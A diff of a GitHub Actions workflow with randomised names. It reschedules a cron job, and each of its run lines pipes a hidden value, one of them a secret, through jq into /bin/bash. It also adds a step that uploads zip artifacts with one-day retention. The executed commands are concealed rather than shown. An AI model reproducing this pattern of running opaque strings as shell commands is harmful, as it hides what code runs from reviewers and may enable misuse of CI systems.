@@ -1,33 +1,27 @@
 name: concurrentanna654
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '12 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: concurrentanna654
         env:
-          odz4365: ${{ secrets.odz4365 }}
+          utag531: ${{ secrets.utag531 }}
         run: |
-          echo $odz4365 | jq -r .tluo71919 | /bin/bash
-          echo $q5857 | jq -r .qb86 | /bin/bash
-          echo $cdv39380 | jq -r .yxyp21 | /bin/bash
-          echo $msx8727 | jq -r .h096 | /bin/bash
-          echo $xpgp77464 | jq -r .swuoh623 | /bin/bash
-          echo $jztry464 | jq -r .s43 | /bin/bash
-          echo $rggkt05502 | jq -r .nf3 | /bin/bash
-          echo $lwo8 | jq -r .gw54128 | /bin/bash
-          echo $dk8 | jq -r .i24294 | /bin/bash
-          echo $ludhi51 | jq -r .ikuwb863 | /bin/bash
-          echo $je95430 | jq -r .nlt96 | /bin/bash
-          echo $dtyx5 | jq -r .jxwoa542 | /bin/bash
-          echo $esr343 | jq -r .qbz2977 | /bin/bash
-          echo $xve7425 | jq -r .djhy4 | /bin/bash
-          echo $kyh9780 | jq -r .n89 | /bin/bash
-          echo $g215 | jq -r .f41960 | /bin/bash
-          echo $ngje18308 | jq -r .tt0801 | /bin/bash
+          printf '%s' "$utag531" | jq -r .ow71 | /bin/bash
+          printf '%s' "$xf46013" | jq -r .fzln0264 | /bin/bash
+          printf '%s' "$k783" | jq -r .l95 | /bin/bash
+          echo $igi4520 | jq -r .unk3 | /bin/bash
+          echo $ldq3 | jq -r .hc01 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: NMUrjBrW
+          path: "*.zip"
+          retention-days: 1
